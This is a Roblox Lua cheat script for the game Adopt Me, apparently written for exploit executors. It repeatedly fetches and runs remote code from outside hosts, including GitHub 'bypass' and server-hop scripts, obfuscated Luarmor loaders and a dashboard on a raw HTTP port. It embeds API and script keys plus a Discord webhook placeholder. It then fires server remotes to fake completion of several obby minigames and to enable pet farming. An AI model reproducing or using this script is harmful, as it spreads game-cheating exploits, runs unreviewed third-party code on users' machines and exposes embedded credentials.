loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
wait(0.1)
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
wait(10)
loadstring(game:HttpGet("https://raw.githubusercontent.com/greg66n/adopt/refs/heads/main/serverhop.lua"))()

wait(1)
local args = {
    [1] = true
}

game:GetService("ReplicatedStorage").API:FindFirstChild("HousingAPI/SetDoorLocked"):InvokeServer(unpack(args))
wait(1)
task.spawn(function()
    task.wait(35)
    getgenv().API_KEY = "pQP1Ma1WE4h81mPToP54"
    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
end)

task.spawn(function()
   -- ARCEUS, CODEX ETC
task.wait(35)
script_key="NxzplPKcRYahKMvLcZtfTAOQURrRclwP";
getgenv().Config = {
    ["Winter_EVENT"] = false,
    ["PetFarmActive"] = true,
    ["EggFarmActive"] = false,
    ["Blur_username"] = true,
    ["Blazing_Lion_Log"] = false,
    ["DiscordId"] = "942321951010086922",
    ["Webhook"] = "https://discord.com/api/webhooks/123456",
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/66567bfd337b57eb059b58dbe1badb89.lua"))()
local args = {
    [1] = "coastal_climb"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(6005)
local args = {
    [1] = "ancient_ruins"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(12500)
local args = {
    [1] = "lonelypeak"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(25009)
local args = {
    [1] = "miniworld"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(30001)
local args = {
    [1] = "pyramid"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(40505)
local args = {
    [1] = "shipwreck_bay"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
wait(60409)
local args = {
    [1] = "tinyisles"
}

game:GetService("ReplicatedStorage").API:FindFirstChild("MinigameAPI/FinishObby"):FireServer(unpack(args))
